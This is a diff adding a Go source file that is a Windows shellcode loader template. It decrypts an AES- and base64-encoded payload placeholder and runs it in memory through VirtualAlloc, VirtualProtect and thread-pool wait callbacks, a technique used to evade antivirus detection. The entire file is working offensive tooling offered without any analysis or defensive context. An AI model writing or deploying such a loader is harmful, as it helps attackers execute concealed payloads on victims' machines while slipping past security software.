@@ -1,0 +1,138 @@
+package main
+
+import (
+	"crypto/aes"
+	"crypto/cipher"
+	"encoding/base64"
+	"encoding/hex"
+	"fmt"
+	"os"
+	"unsafe"
+
+	"golang.org/x/sys/windows"
+)
+
+const (
+	MEM_COMMIT        = 0x1000
+	MEM_RESERVE       = 0x2000
+	PAGE_EXECUTE_READ = 0x20
+	PAGE_READWRITE    = 0x04
+)
+
+var (
+	kernel32 = windows.NewLazySystemDLL("kernel32.dll")
+	ntdll    = windows.NewLazySystemDLL("ntdll.dll")
+
+	VirtualAlloc         = kernel32.NewProc("VirtualAlloc")
+	VirtualProtect       = kernel32.NewProc("VirtualProtect")
+	RtlCopyMemory        = ntdll.NewProc("RtlCopyMemory")
+	CreateThreadPoolWait = kernel32.NewProc("CreateThreadpoolWait")
+	SetThreadPoolWait    = kernel32.NewProc("SetThreadpoolWait")
+	WaitForSingleObject  = kernel32.NewProc("WaitForSingleObject")
+)
+
+// Decrypt: Encrypted Text --> Base64 Decode --> Decrypt with IV and Key
+func Decrypt(key []byte, encryptedText string) string {
+	ciphertext, _ := base64.URLEncoding.DecodeString(encryptedText)
+
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		panic(err)
+	}
+
+	iv := ciphertext[:aes.BlockSize]
+	if len(iv) != aes.BlockSize {
+		panic("[Error] Ciphertext is too short!")
+	}
+
+	ciphertext = ciphertext[aes.BlockSize:]
+	stream := cipher.NewCFBDecrypter(block, iv)
+	stream.XORKeyStream(ciphertext, ciphertext)
+
+	return string(ciphertext)
+}
+
+func Execute(shellcode []byte) {
+	event, err := windows.CreateEvent(
+		nil,
+		0,
+		1,
+		nil,
+	)
+	if err != nil {
+		return
+	}
+
+	addr, _, errVirtualAlloc := VirtualAlloc.Call(
+		0,
+		uintptr(len(shellcode)),
+		MEM_COMMIT|MEM_RESERVE,
+		PAGE_READWRITE,
+	)
+	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
+		panic("[ERROR] Call to VirtualAlloc failed!")
+	}
+
+	_, _, errRtlCopyMemory := RtlCopyMemory.Call(
+		addr,
+		(uintptr)(unsafe.Pointer(&shellcode[0])),
+		uintptr(len(shellcode)),
+	)
+	if errRtlCopyMemory != nil && errRtlCopyMemory.Error() != "The operation completed successfully." {
+		panic("[ERROR] Call to RtlCopyMemory failed!")
+	}
+
+	oldProtect := PAGE_READWRITE
+	_, _, errVirtualProtect := VirtualProtect.Call(
+		addr,
+		uintptr(len(shellcode)),
+		PAGE_EXECUTE_READ,
+		uintptr(unsafe.Pointer(&oldProtect)),
+	)
+	if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
+		panic("[ERROR] Call to VirtualProtect failed!")
+	}
+
+	pool, _, errpool := CreateThreadPoolWait.Call(
+		addr,
+		0,
+		0,
+	)
+	if errpool != nil && errpool.Error() != "The operation completed successfully." {
+		panic("[ERROR] Call to CreateThreadPoolWait failed!")
+	}
+
+	_, _, errpoolwait := SetThreadPoolWait.Call(
+		pool,
+		uintptr(event),
+		0,
+	)
+	if errpoolwait != nil && errpoolwait.Error() != "The operation completed successfully." {
+		panic("[ERROR] Call to SetThreadPoolWait failed!")
+	}
+
+	_, _, errWaitForSingleObject := WaitForSingleObject.Call(
+		uintptr(event),
+		0xFFFFFFFF,
+	)
+	if errWaitForSingleObject != nil && errWaitForSingleObject.Error() != "The operation completed successfully." {
+		panic("[ERROR] Call to WaitForSingleObject failed!")
+	}
+}
+
+func main() {
+	encShellcode := "{{.Shellcode}}"
+	key := []byte("{{.Key}}")
+
+	// Decrypt base64/AES to original value
+	decShellcode := Decrypt(key, encShellcode)
+
+	shellcode, err := hex.DecodeString(decShellcode)
+
+	if err != nil {
+		fmt.Printf("[ERROR] Error Decoding: %s\n", err)
+		os.Exit(1)
+	}
+
+	Execute(shellcode)
+}
